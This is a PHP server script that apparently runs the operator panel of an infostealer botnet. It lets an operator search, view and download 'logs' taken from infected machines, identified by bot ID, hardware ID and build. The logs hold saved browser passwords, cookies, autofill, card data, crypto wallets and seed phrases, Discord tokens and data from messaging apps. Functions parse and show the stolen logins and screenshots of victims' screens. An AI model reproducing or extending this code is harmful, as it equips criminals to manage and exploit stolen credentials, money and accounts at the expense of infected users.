<?php

include_once "../../config.php";
include_once "../app/functions.php";
include_once "../app/managers/AccountManager.php";

session_start();
header('Content-Type: application/json; charset=utf-8');

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$method                = isset($_POST["method"]) ? $_POST["method"] : null;
$log_id                = isset($_POST["log_id"]) ? $_POST["log_id"] : null;

$comment               = base64_decode($_POST["comment"]);
$get_favorite          = $_POST["favorite"];

$page                  = isset($_POST["page"]) ? $_POST["page"] : 1;
$parse_passwords       = base64_decode($_POST["parse_passwords"]);
$parse_note            = base64_decode($_POST["parse_note"]);
$parse_date            = base64_decode($_POST["parse_date"]);
$parse_ip              = base64_decode($_POST["parse_ip"]);
$parse_builds          = base64_decode($_POST["parse_builds"]);
$parse_cookies         = base64_decode($_POST["parse_cookies"]);
$parse_countries       = base64_decode($_POST["parse_countries"]);
$parse_system          = base64_decode($_POST["parse_system"]);
$parse_wallets         = base64_decode($_POST["parse_wallets"]);

$parse_with_wallets    = $_POST["parse_with_wallets"];
$parse_with_mnemonic   = $_POST["parse_with_mnemonic"];

$parse_no_empty        = $_POST["parse_no_empty"];
$parse_repeated        = $_POST["parse_repeated"];
$parse_favorites       = $_POST["parse_favorites"];

$parse_steam           = $_POST["parse_steam"];
$parse_tox             = $_POST["parse_tox"];
$parse_outlook         = $_POST["parse_outlook"];
$parse_discord         = $_POST["parse_discord"];
$parse_telegram        = $_POST["parse_telegram"];
$parse_pidgin          = $_POST["parse_pidgin"];

$parse_no_download     = $_POST["parse_no_download"];
$parse_download        = $_POST["parse_download"];

$parse_marker          = base64_decode($_POST["parse_marker"]);

$draw                   = isset($_POST['draw']) ? intval($_POST['draw']) : 0;
$start                  = isset($_POST['start']) ? intval($_POST['start']) : 0;
$length                 = isset($_POST['length']) ? intval($_POST['length']) : 10;

$method_get             = isset($_GET["method"]) ? $_GET["method"] : null;
$filename               = isset($_GET['filename']) ? $_GET['filename'] : null;

$logs                   = isset($_POST['logs']) ? $_POST['logs'] : null;

$download_id            = isset($_POST["download_id"]) ? $_POST["download_id"] : null;

$log                    = isset($_GET['log']) ? $_GET['log'] : null;

/**
 * check actions
 */
if($method != null)
{
    switch($method)
    {
        // view and search logs
        case "search":
            ViewLogsTable(
                $page,
                $draw,
                $start,
                $length,
                false, 
                "", 
                $parse_passwords, 
                $parse_note, 
                $parse_date, 
                $parse_ip,
                $parse_builds,
                $parse_cookies, 
                $parse_countries, 
                $parse_system, 
                $parse_wallets,
                
                $parse_no_empty,
                $parse_repeated,
                $parse_with_wallets,
                $parse_with_mnemonic,
                $parse_favorites,
                 
                $parse_steam, 
                $parse_tox, 
                $parse_outlook, 
                $parse_discord, 
                $parse_telegram, 
                $parse_pidgin,
                
                $parse_no_download,
                $parse_download,
                
                $parse_marker
            );
            break;

        case "view_plugin":
            break;

        case "get_info":
            viewLogInfo($log_id);
            break;

        case "change_favorite":
            UpdateLogFavorite($log_id, $get_favorite);
            break;

        case "get_stats":
            getStats();
            break;

        case "get_passwords":
            getModalPasswords($log_id);
            break;

        case "change_comment":
            SaveComment($log_id, $comment);
            break;

        case "delete_logs":
            DeleteLogs($logs);
            break;
            
        case "get_downloads":
            getDownloadsList();
            break;

        case "delete_download":
            deleteDownload($download_id);
            break;

        case "get_mnemonic":
            getMnemonic($link, $log_id);
            break;

        default:
            echo json_encode(['error' => 'Unknown method']);
            exit(0);
            break;
    }
}

if($method_get != null)
{
    switch($method_get)
    {
        case "get_screenshot":
            getModalScreenshot($filename);
            break;

        case "download":
            downloadLog($filename);
            break;

        case "download_from_log":
            downloadFromLog($log, $filename);
            break;
    }
}

/**
 * ViewLogsTable
 *
 * 
 *
 */
function ViewLogsTable(
    $page,
    $draw,
    $start,
    $length,
    $is_download,
    $type,
    $parse_passwords,
    $parse_note,
    $parse_date,
    $parse_ip,
    $parse_builds,
    $parse_cookies,
    $parse_countries,
    $parse_system,
    $parse_wallets,

    $parse_no_empty,
    $parse_repeated,
    $parse_with_wallets,
    $parse_with_mnemonic,
    $parse_favorites,

    $parse_steam,
    $parse_tox,
    $parse_outlook,
    $parse_discord,
    $parse_telegram,
    $parse_pidgin,

    $parse_no_download,
    $parse_download,

    $parse_marker
)
{
    $link = ConnectDB();

    $offset = (int)$length;

    $conditions = [];

    if ($parse_passwords !== null && $parse_passwords !== '') {
        $pattern = trim(preg_replace('/\s+/', '', $parse_passwords));
        $pattern = str_replace(',', '|', $pattern);
        $pattern = $link->real_escape_string($pattern);
        $conditions[] = "`array_passwords` RLIKE '{$pattern}'";
    }

    if ($parse_note !== null && $parse_note !== '') {
        $note = $link->real_escape_string($parse_note);
        $conditions[] = "`comment` LIKE '%{$note}%'";
    }

    if ($parse_ip !== null && $parse_ip !== '') {
        $pattern = trim(preg_replace('/\s+/', '', $parse_ip));
        $pattern = str_replace(',', '|', $pattern);
        $pattern = $link->real_escape_string($pattern);
        $conditions[] = "`ip` RLIKE '{$pattern}'";
    }

    if(strlen($_SESSION['builds']) > 0)
    {
        $parse_builds = $_SESSION['builds'];
    }

    if ($parse_builds !== null && $parse_builds !== '') 
    {
        if(strlen($_SESSION['builds']) > 0)
        {
            $allowedArray = array_map('trim', explode(',', $_SESSION['builds']));
            $allBuildsArray = array_map('trim', explode(',', $parse_builds));

            $filtered = array_filter($allBuildsArray, function($build) use ($allowedArray) {
                return in_array($build, $allowedArray);
            });

            $parse_builds = implode(',', $filtered);
        }

        $builds = array_map(
            fn($b) => $link->real_escape_string(trim($b)),
            explode(',', $parse_builds)
        );

        $inBuilds = "'" . implode("','", $builds) . "'";
        $conditions[] = "`build` IN ({$inBuilds})";
    }

    if ($parse_marker !== null && $parse_marker !== '') {
        $markerIds = array_map(
            fn($m) => $link->real_escape_string(trim($m)),
            explode(',', $parse_marker)
        );
        
        $markerSql = "SELECT `urls` FROM `markers` WHERE `name` IN ('" . implode("','", $markerIds) . "')";
        $marker_rules = $link->query($markerSql);
        
        $rLikeParts = [];
        if ($marker_rules && $marker_rules->num_rows > 0) {
            while ($marker_rule = $marker_rules->fetch_assoc()) {
                $_urls = array_map('trim', explode(',', $marker_rule['urls']));
                $rLikeParts[] = implode('|', $_urls);
            }
        }
        
        if (!empty($rLikeParts)) {
            $regex = implode('|', $rLikeParts);
            $regex = $link->real_escape_string($regex);
            $conditions[] = "`array_passwords` RLIKE ('{$regex}')";
        }
    }

    if ($parse_countries !== null && $parse_countries !== '') {
        $countries = array_map(
            fn($c) => $link->real_escape_string(trim($c)),
            explode(',', $parse_countries)
        );
        $inCountries = "'" . implode("','", $countries) . "'";
        $conditions[] = "`iso` IN ({$inCountries})";
    }

    if ($parse_cookies !== null && $parse_cookies !== '') {
        $pattern = trim(preg_replace('/\s+/', '', $parse_cookies));
        $pattern = str_replace(',', '|', $pattern);
        $pattern = $link->real_escape_string($pattern);
        $conditions[] = "`array_cookies` RLIKE '{$pattern}'";
    }

    if ($parse_date !== null && $parse_date !== '') {
        $dates = explode(' - ', $parse_date);
        if (count($dates) === 2) {
            $date1 = date("Y-m-d 00:00:00", strtotime($dates[0]));
            $date2 = date("Y-m-d 23:59:59", strtotime($dates[1]));
            $date1 = $link->real_escape_string($date1);
            $date2 = $link->real_escape_string($date2);
            $conditions[] = "`date` BETWEEN '{$date1}' AND '{$date2}'";
        }
    }

    if ($parse_system !== null && $parse_system !== '') {
        $pattern = trim(preg_replace('/\s+/', '', $parse_system));
        $pattern = str_replace(',', '|', $pattern);
        $pattern = $link->real_escape_string($pattern);
        $conditions[] = "`file_information` RLIKE '{$pattern}'";
    }

    if ($parse_wallets !== null && $parse_wallets !== '') {
        $pattern = trim(preg_replace('/\s+/', '', $parse_wallets));
        $pattern = str_replace(',', '|', $pattern);
        $pattern = $link->real_escape_string($pattern);
        $conditions[] = "`array_wallets` RLIKE '{$pattern}'";
    }

    if ($parse_repeated === '1') {
        $conditions[] = "`repeated` != '1'";
    }

    if ($parse_with_wallets === '1') {
        $conditions[] = "`count_wallets` != '0'";
    }

    if ($parse_with_mnemonic === '1') {
        $conditions[] = "`log_status` = '3'";
    }

    if ($parse_no_empty === '1') {
        $conditions[] = "`count_passwords` > 1";
    }

    if ($parse_favorites === '1') {
        $conditions[] = "`favorite` = '1'";
    }

    $softFlags = [];
    if ($parse_steam === '1') {
        $softFlags[] = "Steam";
    }
    if ($parse_tox === '1') {
        $softFlags[] = "Tox";
    }
    if ($parse_outlook === '1') {
        $softFlags[] = "Outlook";
    }
    if ($parse_discord === '1') {
        $softFlags[] = "Discord";
    }
    if ($parse_telegram === '1') {
        $softFlags[] = "Telegram";
    }
    if ($parse_pidgin === '1') {
        $softFlags[] = "Pidgin";
    }
    if (!empty($softFlags)) {
        $subConditions = ["`log_info` LIKE '%soft%'"];
        foreach ($softFlags as $flag) {
            $safeFlag = $link->real_escape_string($flag);
            $subConditions[] = "`log_info` LIKE '%{$safeFlag}%'";
        }
        $conditions[] = "(" . implode(" AND ", $subConditions) . ")";
    }

    if ($parse_no_download === '1') {
        $conditions[] = "`download` = '0'";
    }

    if ($parse_download === '1') {
        $conditions[] = "`download` != '0'";
    }

    $groupBy = '';

    $whereClause = '';
    if (!empty($conditions)) {
        $whereClause = ' WHERE ' . implode(' AND ', $conditions);
    }

    $limitStart = $start;
    $limitCount = $offset;

    $count_logs = getCount($link, $whereClause . $groupBy);

    $query = "SELECT * FROM `logs`"
        . $whereClause
        . $groupBy
        . " ORDER BY log_id DESC"
        . " LIMIT {$limitStart}, {$limitCount}";

    $logs = $link->query($query);

    $data = [];
    while ($log = $logs->fetch_assoc()) 
    {
        $log_info = json_decode($log["log_info"], true);

        if (json_last_error() !== JSON_ERROR_NONE) 
        {
            $log_info = [];
        }

        removeNestedKey($log_info, ['pc_username']);
        removeNestedKey($log_info, ['pc_name']);
        removeNestedKey($log_info, ['cookies']);
        removeNestedKey($log_info, ['autofill']);
        removeNestedKey($log_info, ['cc']);
        removeNestedKey($log_info, ['soft', 'Discord', 'tokens']);


        foreach ($log_info['plugins'] as $pluginName => $pluginData) 
        {
            if (isset($pluginData['count'])) 
            {
                $log_info['plugins'][$pluginName] = ['count' => $pluginData['count']];
            } else 
            {
                unset($log_info['plugins'][$pluginName]);
            }
        }

        $data[] = [
            'log_id'            => $log["log_id"],
            'bot_id'            => $log["bot_id"],
            'count_passwords'   => $log["count_passwords"],
            'count_cc'          => $log["count_cc"],
            'build'             => $log["build"],
            'ip'                => $log["ip"],
            'country'           => $log["iso"],
            'repeated'          => $log["repeated"],
            'date'              => $log["date"],
            'favorite'          => $log["favorite"],
            'comment'           => $log["comment"],
            'status'            => $log["log_status"],
            'filesize'          => humanFileSize($log["size"]),
            'log_info'          => json_encode($log_info),
            'download'          => $log["download"],
            'filename'          => $log["filename"],
            'screenshot'        => $log["screenshot"],
            'hwid'              => $log["hwid"]
        ];
    }

    // Вычисляем общее число страниц
    $total_pages = ($offset > 0) ? ceil($count_logs / $offset) : 0;

    // Формируем ответ для DataTables с дополнительной информацией о страницах
    $response = [
        "draw"            => $draw,
        "recordsTotal"    => $count_logs,
        "recordsFiltered" => $count_logs,
        "current_page"    => $page,
        "total_pages"     => $total_pages,
        "data"            => $data
    ];

    echo json_encode($response);
    exit();
}

/**
 * removeNestedKey
 *
 * clear log info array for datatables
 *
 */
function removeNestedKey(?array &$array, array $path): bool {
    if ($array === null || empty($path)) {
        return false;
    }
    
    $current = &$array;
    $lastKey = array_pop($path);
    
    foreach ($path as $key) {
        if (!isset($current[$key]) || !is_array($current[$key])) {
            return false;
        }
        $current = &$current[$key];
    }
    
    if (array_key_exists($lastKey, $current)) {
        unset($current[$lastKey]);
        return true;
    }
    
    return false;
}



/**
 * getStats
 *
 * Get stats for logs page
 *
 * @param $link
 * @return json
 */
function getStats()
{
    $link = ConnectDB();

    $_countries = array();
    $countries = $link->query("SELECT iso, COUNT(*) as count FROM logs GROUP BY iso ORDER BY `count` DESC;");
    
    while ($country = $countries->fetch_assoc())
    {
        $_countries[] = array(
            "id"   => $country['iso'],
            "text" => $country['iso'] . ' (' . $country['count'] . ')',
        );
    }

    $_builds = array();

    if(strlen($_SESSION['builds']) > 0)
    {
        foreach (explode(",", $_SESSION['builds']) as $build) 
        {
            $_builds[] = array(
                "id"   => $build,
                "text" => $build,
            );
        }
    }
    else
    {
        $builds = $link->query("SELECT name FROM builds;");
    
        while ($build = $builds->fetch_assoc())
        {
            $_builds[] = array(
                "id"   => $build['name'],
                "text" => $build['name'],
            );
        }
    }

    $_markers = array();
    $markers = $link->query("SELECT name FROM markers;");
    
    while ($marker = $markers->fetch_assoc())
    {
        $_markers[] = array(
            "id"   => $marker['name'],
            "text" => $marker['name'],
        );
    }

    // get downloads count
    $sql = "SELECT 1 FROM downloads LIMIT 1";
    $result = $link->query($sql);
    $downloads_created = false;
    
    if ($result && $result->num_rows > 0) 
    {
        $downloads_created = true;
    }
    
    // generate response
    $response = [
        //"theme"                 => "light",// dark light
        //"colorset"              => "Blue_Theme", // Blue_Theme Aqua_Theme Purple_Theme Green_Theme Cyan_Theme Orange_Theme
        "logs_count"            => getLogsCount($link),
        "unique_logs_percent"   => getUniqueLogsPercent($link)."%",
        "fully_logs_count"      => getFullyLogsCount($link),
        "passwords_count"       => getPasswordsCount($link),
        "early_log_date"        => getEarlyLogDate($link),
        "countries"             => $_countries,
        "builds"                => $_builds,
        "markers"               => $_markers,
        "downloads_created"     => $downloads_created
    ];

    echo json_encode($response);
    exit();
}

/**
 * getPasswordsCount
 *
 * Get passwords count
 *
 * @param $link
 * @return int
 */
function getPasswordsCount($link)
{
    $count = 0;
	
	$query = "SELECT SUM(count_passwords) AS total_requests FROM logs";

    if (isset($_SESSION['builds']) && strlen(trim($_SESSION['builds'])) > 0) 
    {
        $build = $link->real_escape_string(trim($_SESSION['builds']));
        $query .= " WHERE `build` = '$build'";
    }
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->execute();
		
		$stmt->store_result();
		
		if ($stmt->num_rows > 0)
		{
			$stmt->bind_result($count);
			$stmt->fetch();
		}
		else
		{
			return 0;
		}
	}

    if(isset($count))
    {
        return $count;
    }
    else
    {
        return 0;
    }
}

/**
 * getLogsCount
 *
 * Calculate logs count
 *
 * @param $link
 * @return count of logs
 */
function getLogsCount($link)
{
    $count = 0;
    
    $query = "SELECT COUNT(*) FROM `logs`";
    
    if (isset($_SESSION['builds']) && strlen(trim($_SESSION['builds'])) > 0) 
    {
        $build = $link->real_escape_string(trim($_SESSION['builds']));
        $query .= " WHERE `build` = '$build'";
    }
    
    $query .= ";";
    
    if ($stmt = $link->prepare($query)) 
    {
        $stmt->execute();
        $stmt->store_result();

        if ($stmt->num_rows > 0) 
        {
            $stmt->bind_result($count);
            $stmt->fetch();
        } 
        else 
        {
            return 0;
        }
    }
    
    return $count;
}

/**
 * getUniqueLogsPercent
 *
 * Calculate unique logs persent
 *
 * @param $link
 * @return persent of unique logs
 */
function getUniqueLogsPercent($link)
{
	$unique_logs_count 		= getUniqueLogsCount($link);
	$_logs_count 			= getLogsCount($link);
	
	return Persent($unique_logs_count, $_logs_count);
}

/**
 * getUniqueLogsCount
 *
 * Calculate unique logs count
 *
 * @param $link
 * @return count of unique logs
 */
function getUniqueLogsCount($link)
{
	$logs_count = 0;
	
	$query = "SELECT COUNT(*)  FROM `logs` WHERE `repeated`='0';";
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->execute();
		
		$stmt->store_result();
		
		if ($stmt->num_rows > 0)
		{
			$stmt->bind_result($logs_count);
			$stmt->fetch();
		}
		else
		{
			return 0;
		}
	}
	
	return $logs_count;
}

/**
 * Persent
 *
 * Persent calculator
 *
 * @param $var
 * @param $basa
 * @param $persent
 * @return persent by var
 */
function Persent($var, $basa = 100, $persent = true) 
{
	if (!$var == 0 && !$basa == 0)
	{
		$d = $var/$basa;
  
		if($persent) return round($d*100);

		return $d;
	}
	return 0;
  
}

/**
 * getFullyLogsCount
 *
 * Calculate full uploaded logs
 *
 * @param $link
 * @return count of full uploaded logs
 */
function getFullyLogsCount($link)
{
	$logs_count = 0;
	
	$query = "SELECT COUNT(*)  FROM `logs` WHERE `log_status` = '2' OR `log_status` = '3'";

    if (isset($_SESSION['builds']) && strlen(trim($_SESSION['builds'])) > 0) 
    {
        $build = $link->real_escape_string(trim($_SESSION['builds']));
        $query .= " AND `build` = '$build'";
    }
    
    $query .= ";";
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->execute();
		
		$stmt->store_result();
		
		if ($stmt->num_rows > 0)
		{
			$stmt->bind_result($logs_count);
			$stmt->fetch();
		}
		else
		{
			return 0;
		}
	}
	
	return $logs_count;
}

/**
 * getCount
 *
 * Get logs count by current search request
 *
 * @param $link
 * @param $sql
 * @return int logs count by search request
 */
function getCount($link, $sql)
{
    $requestHeader = "SELECT COUNT(`log_id`) AS `count` FROM `logs` ";

    $requestHeader .= $sql;
    $sql = $requestHeader;
    $sql .= " ORDER BY MAX(log_id) DESC;";

    $count = $link->query($sql);
    return $count->fetch_assoc()['count'];
}

/**
 * humanFileSize
 *
 * Convert bytes to human readable format
 * https://stackoverflow.com/a/15188082
 *
 * @param $size
 * @return readable size
 */
function humanFileSize($size, $unit="") 
{
    if((!$unit && $size >= 1<<30) || $unit == "GB")
        return number_format($size/(1<<30),2)."GB";
    if((!$unit && $size >= 1<<20) || $unit == "MB")
        return number_format($size/(1<<20),2)."MB";
    if((!$unit && $size >= 1<<10) || $unit == "KB")
        return number_format($size/(1<<10),2)."KB";
    return number_format($size)." bytes";
}

/**
 * getEarlyLogDate
 *
 * Getting early log date for datepicker
 *
 * @param $link
 * @return date for datepicker
 */
function getEarlyLogDate($link)
{
	$log = $link->query("SELECT date FROM `logs` WHERE 1 ORDER BY `logs`.`log_id` ASC LIMIT 1")->fetch_array();
	
	$date_old;
	
	if(isset($log["date"]))
	{
		$date_old = date("m/d/Y", strtotime($log["date"]));
	}
	else
	{
		$date_old = date('m/d/Y', time());
	}
	
	$date_current = date('m/d/Y', time());
	
	return $date_old ." - ". $date_current;
}

/**
 * getModalPasswords
 *
 * View modal with passwords from log
 *
 * @param $link
 * @param $log_id
 * @return none
 */
function getModalPasswords($log_id)
{
    $link = ConnectDB();

    $stmt = $link->prepare("SELECT `array_passwords` FROM `logs` WHERE `log_id` = ?");

    if ($stmt)
    {
        $stmt->bind_param("i", $log_id);
        $stmt->execute();

        $stmt->bind_result($passwords);
        $stmt->fetch();

        $stmt->close();

        $working = explode("\n", $passwords);
        array_pop($working);

        $linec                  = 0;

        $soft                   = "";
        $profile                = "";
        $url                    = "";
        $login                  = "";
        $password               = "";

        $response = [];

        foreach($working as $line)
        {
            if($linec > 5)
            {
                $linec          = 0;

                $soft           = "";
                $profile        = "";
                $url            = "";
                $login          = "";
                $password       = "";
            }

            $linec++;

            switch($linec)
            {
                case 1:
                    $soft = substr($line, 9);
                    break;

                case 2:
                    $profile = substr($line, 9);
                    break;

                case 3:
                    $url = substr($line, 5);
                    $parsed_url = parse_url($url);


                    break;

                case 4:
                    $login = substr($line, 7);
                    break;

                case 5:
                    $password = substr($line, 10);

                    $response[] = [
                        "soft" => $soft,
                        "profile" => $profile,
                        "url" => $parsed_url["host"],
                        "full_path" => $url,
                        "login" => $login,
                        "password" => $password
                    ];
                    break;
            }
        }

        echo json_encode($response);
        exit();
    }
    else
    {
        // return error
        echo json_encode(['error' => 'Error preparing request']);
        exit();
    }

    echo json_encode(['error' => 'Unknown error']);
    exit();
}

/**
 * getModalScreenshot
 *
 * View modal with screenshot
 *
 * @param $filename
 * @return none
 */
function getModalScreenshot($filename)
{
    $z = new ZipArchive();
	$zip_path = "../../".LOGS_PATH."/". basename($filename);
	
    if ($z->open($zip_path) !== true) 
    {
        echo "File not found.";
        return false;
    }
        
    $stat = $z->statName("screenshot.jpg");
	$fp   = $z->getStream("screenshot.jpg");
	
    if(!$fp) 
    {
		echo "Could not load image.";
		return false;
	}
	else
	{
		header('Content-Type: image/jpeg');
		header('Content-Length: ' . $stat['size']);
		fpassthru($fp);
	}
			
	exit(0);
}

/**
 * UpdateLogFavorite
 *
 * change log favorite state
 *
 * @param $link
 * @param $log_id
 * @param $get_favorite
 * @return none
 */
function UpdateLogFavorite($log_id, $get_favorite)
{
    $link = ConnectDB();

    $query = "UPDATE `logs` SET `favorite` = ? WHERE `log_id` = ?";
	
	if ($stmt = $link->prepare($query))
	{
		$stmt->bind_param('ii', $get_favorite, $log_id);
		$stmt->execute();
	}
}

/**
 * SaveComment
 *
 * change log commentary
 *
 * @param $link
 * @param $log_id
 * @param $comment
 * @return none
 */
function SaveComment($log_id, $comment)
{
    $link = ConnectDB();

    $query = "UPDATE `logs` SET `comment` = ? WHERE `log_id` = ?";
	
	if ($stmt = $link->prepare($query))
	{
		$stmt->bind_param('si', $comment, $log_id);
		$stmt->execute();
	}
}

/**
 * downloadLog
 *
 * get log file
 *
 * @param $filename
 * @return none
 */
function downloadLog($filename)
{
    $link = ConnectDB();

    $reading = "";
	$zip_path = "../../".LOGS_PATH."/". basename($filename);
	
	$handle = fopen($zip_path, "r");
		
	if($handle)
	{
		// add downloaded
		updateDownloadCount($link, $filename);
			
		$reading = fread($handle, filesize($zip_path));
			
		header('Content-type: application/txt');
		header('Content-Disposition: attachment; filename="'. $filename .'"');
		header('Content-Length: ' . strlen($reading));
			
		echo $reading;
	}
	else 
	{
		echo 'Error Reading File.';
	}
		
	exit(0);
}

/*
* updateDownloadCount
* 
*/
function updateDownloadCount($link, $filename)
{
	$query = "UPDATE `logs` SET `download`=`download`+1 WHERE `filename`=?;";
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->bind_param('s', $filename);
		$stmt->execute();
	}
}

/**
 * viewLogInfo
 *
 * View log info table modal
 *
 * @param $log_id
 * @return none
 */
function viewLogInfo($log_id)
{
    $link = ConnectDB();
    
    $log_id = mysqli_real_escape_string($link, $log_id);
	
	$log = $link->query("SELECT * FROM `logs` WHERE `log_id`='$log_id'")->fetch_array();

    $response = [];

    if($log != null)
    {
        $log_info = json_decode($log["log_info"], true);

        $response["log_id"]             = $log["log_id"];
        $response["HWID"]               = $log["hwid"];
        $response["Build"]              = $log["build"];
        $response["Downloads"]          = $log["download"];
        $response["IP"]                 = $log["ip"];
        $response["Country"]            = $log["iso"];
        $response["Passwords"]          = $log["count_passwords"];
        $response["Cookies"]            = $log["count_cookies"];
        
        if($log["count_passwords"] > 0)
        {
            $response["filename"]       = $log["filename"];
        }

        $response["log_info"]           = json_decode($log["log_info"], true);
    }
    else
    {
        echo json_encode(['error' => 'log not found']);
        exit();
    }

    echo json_encode($response);
    exit();
}

/**
 * DeleteLogs
 *
 * delete logs from db and disk
 *
 * @param $logs
 * @return none
 */
function DeleteLogs($ids_str)
{
    $results = array();

    $mysqli = ConnectDB();

    $ids_array = array_map('intval', explode(',', $ids_str));

    if (empty($ids_array)) 
    {
        echo json_encode(['error' => 'No log_ids provided']);
        exit();
    }

    $selectStmt = $mysqli->prepare("SELECT filename FROM logs WHERE log_id = ?");
    
    if (!$selectStmt) 
    {
        echo json_encode(['error' => 'Error preparing SELECT: ' . $mysqli->error]);
        exit();
    }

    $deleteStmt = $mysqli->prepare("DELETE FROM logs WHERE log_id = ?");
    
    if (!$deleteStmt) 
    {
        $selectStmt->close();
        
        echo json_encode(['error' => 'Error preparing DELETE: ' . $mysqli->error]);
        exit();
    }

    foreach ($ids_array as $id)
    {
        $status = 'success';
        $message = '';

        $selectStmt->bind_param("i", $id);

        if (!$selectStmt->execute()) 
        {
            $status = 'error';
            $message = "Error executing SELECT for id $id: " . $selectStmt->error;
        }
        else
        {
            $result = $selectStmt->get_result();

            if (!$result) 
            {
                $status = 'error';
                $message = "Error fetching result for id $id: " . $selectStmt->error;
            } 
            elseif ($row = $result->fetch_assoc()) 
            {
                $filename = $row['filename'];
                $zip_path = "../../" . LOGS_PATH . "/" . basename($filename);

                if (file_exists($zip_path) && is_file($zip_path)) 
                {
                    if (!unlink($zip_path)) 
                    {
                        $status = 'error';
                        $message = "Error deleting file: $filename";
                    }
                }
                else
                {
                    $status = 'error';
                    $message = "File not found or inaccessible: $filename";
                }
                
                $deleteStmt->bind_param("i", $id);
                
                if (!$deleteStmt->execute()) 
                {
                    $status = 'error';
                    $message = "Error deleting record with id $id: " . $deleteStmt->error;
                } 
                else 
                {
                    if ($status === 'success') 
                    {
                        $message = "Log #$id and file $filename deleted successfully.";
                    }
                    else
                    {
                        $message = "Log #$id deleted from db, but $filename not deleted.";
                    }
                }
            }
            else 
            {
                $status = 'error';
                $message = "Record with id $id not found.";
            }
            $result->free(); 
        }

        $results[] = array(
            'id'      => $id,
            'status'  => $status,
            'message' => $message
        );
    }

    $selectStmt->close();
    $deleteStmt->close();

    echo json_encode($results);
}

/**
 * getDownloadsList
 *
 * 
 *
 * @return none
 */
function getDownloadsList()
{
    $link = ConnectDB();
    
    $sql = "SELECT id, token, status, total_files, processed_files, download_url, created_at FROM downloads ORDER BY created_at DESC";
    $result = $link->query($sql);

    if (!$result) 
    {
        echo json_encode(['success' => false, 'error' => 'Error executing request: ' . $link->error]);
        $link->close();
        exit;
    }
    
    $data = [];
    
    while ($row = $result->fetch_assoc()) 
    {
        $data[] = $row;
    }

    $result->free();
    $link->close();
    
    echo json_encode(['success' => true, 'data' => $data]);

    exit();
}

/**
 * deleteDownload
 *
 * 
 *
 * @return none
 */
function deleteDownload($download_id)
{
    $link = ConnectDB();

    $stmt = $link->prepare("SELECT download_url FROM downloads WHERE id = ?");

    if (!$stmt) 
    {
        echo json_encode(['success' => false, 'error' => 'Error preparing request to get download_url']);
        $link->close();
        exit();
    }

    $stmt->bind_param("i", $download_id);
    
    if (!$stmt->execute()) 
    {
        echo json_encode(['success' => false, 'error' => 'Error executing request to get download_url']);
        $stmt->close();
        $link->close();
        exit();
    }

    $result = $stmt->get_result();
    $download_url = "";

    if ($row = $result->fetch_assoc()) 
    {
        $download_url = $row['download_url'];
    }

    $stmt->close();

    if (!empty($download_url)) 
    {
        $file_path = "../" . $download_url;

        if (file_exists($file_path)) 
        {
            if (!unlink($file_path)) 
            {
                echo json_encode(['success' => false, 'error' => 'Failed to delete file']);
                $link->close();
                exit();
            }
        } 
        else 
        {
            echo json_encode(['success' => false, 'error' => 'File to delete not found']);
            $link->close();
            exit();
        }
    }

    $stmt = $link->prepare("DELETE FROM downloads WHERE id = ?");

    if (!$stmt) 
    {
        echo json_encode(['success' => false, 'error' => 'Error preparing request']);
        $link->close();
        exit();
    }
    
    $stmt->bind_param("i", $download_id);
    
    if (!$stmt->execute()) 
    {
        echo json_encode(['success' => false, 'error' => 'Error executing request']);
        $stmt->close();
        $link->close();
        exit;
    }

    echo json_encode(['success' => true]);
    
    $stmt->close();
    $link->close();
    exit();
}

/**
 * deleteDownload
 *
 * 
 *
 * @return none
 */
function downloadFromLog($log, $filename)
{
    $z = new ZipArchive();
	$zip_path = "../../".LOGS_PATH."/". basename($log);
	
    if ($z->open($zip_path) !== true) 
    {
        echo "File not found.";
        return false;
    }
        
    $reading = $z->getFromName($filename);
    $z->close();

    header('Content-type: application/txt');
	header('Content-Disposition: attachment; filename="'. basename($filename) .'"');
	header('Content-Length: ' . strlen($reading));
	
	echo $reading;
	exit(0);
}

function getMnemonic($link, $log_id)
{
    $log_id = mysqli_real_escape_string($link, $log_id);
	
	$log = $link->query("SELECT * FROM `logs` WHERE `log_id`='$log_id'")->fetch_array();

    $response = [];

    if($log != null)
    {
        $response["log_info"]           = json_decode($log["log_info"], true);
    }
    else
    {
        echo json_encode(['error' => 'log not found']);
        exit();
    }

    echo json_encode($response);
    exit();
}

?>